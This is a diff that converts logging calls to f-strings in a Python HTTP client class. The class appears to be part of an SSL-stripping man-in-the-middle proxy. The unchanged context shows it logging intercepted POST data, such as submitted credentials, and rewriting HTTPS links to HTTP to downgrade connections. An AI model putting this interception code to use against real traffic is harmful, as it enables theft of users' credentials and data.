@@ -53,18 +53,23 @@ class ServerConnection(HTTPClient):
         return "POST"
 
     def sendRequest(self):
-        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
+        logging.log(self.getLogLevel(), f"Sending Request: {self.command} {self.uri}")
         self.sendCommand(self.command, self.uri)
 
     def sendHeaders(self):
         for header, value in self.headers.items():
-            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
+            logging.log(self.getLogLevel(), f"Sending header: {header} : {value}")
             self.sendHeader(header, value)
 
         self.endHeaders()
 
     def sendPostData(self):
-        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
+        logging.warning(
+            f"{self.getPostPrefix()} Data ("
+            + self.headers['host']
+            + "):\n"
+            + str(self.postData)
+        )
         self.transport.write(self.postData)
 
     def connectionMade(self):
@@ -76,7 +81,9 @@ class ServerConnection(HTTPClient):
             self.sendPostData()
 
     def handleStatus(self, version, code, message):
-        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
+        logging.log(
+            self.getLogLevel(), f"Got server response: {version} {code} {message}"
+        )
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
@@ -147,7 +154,7 @@ class ServerConnection(HTTPClient):
         for match in iterator:
             url = match.group()
 
-            logging.debug("Found secure reference: " + url)
+            logging.debug(f"Found secure reference: {url}")
 
             url = url.replace('https://', 'http://', 1)
             url = url.replace('&amp;', '&')
